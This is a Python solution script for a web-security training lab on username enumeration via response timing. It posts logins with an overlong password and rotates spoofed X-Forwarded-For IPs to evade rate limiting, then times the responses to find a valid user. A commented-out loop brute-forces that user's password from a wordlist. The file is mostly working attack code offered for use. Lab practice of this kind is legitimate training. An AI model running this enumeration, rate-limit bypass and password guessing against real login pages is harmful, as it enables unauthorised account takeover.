# Lab: Username enumeration via response timing
import requests

from datetime import timedelta


URL = "https://0ab900f60346156f80ff63bf00fd0034.web-security-academy.net/login"

ips = []
for i in range(256):
    ips.append("10.25.13." + str(i))




# Détermine le correct user
# In the first enumeration i saw that there was a sequence like this 
# 0:00:00.121452
# 0:00:00.119294
# 0:00:01.169843           This is the one that we want
# 0:00:00.136624
# 0:00:00.117558
# 0:00:00.121992
with open("username.txt", 'r') as users_file:
    for user in users_file:
    
        ip = ips.pop(0)
        paaaa = "fqsdfapizue15648qsdf" * 50
        data = {'username': user, 'password': paaaa}
        headers = {
            'X-Forwarded-For': ip
        }
        response = requests.post(URL, data=data, headers=headers)
        threshold = timedelta(seconds=0.7)

        print(data["username"], response.elapsed)
# res : administrador

# Détermine son password
# with open("password.txt", 'r') as passwords_file:
#     for password in passwords_file:
#         password = password.strip('\n')
#         data = {'username': "atlas", 'password': password}
#         ip = ips.pop(0)
#         headers = {
#             'X-Forwarded-For': ip
#         }
#         response = requests.post(URL, data=data, headers=headers)
#         print(response.status_code)

#         if 'Invalid username or password.' not in response.text:
#             print("Login réussi avec:", data)
#             break

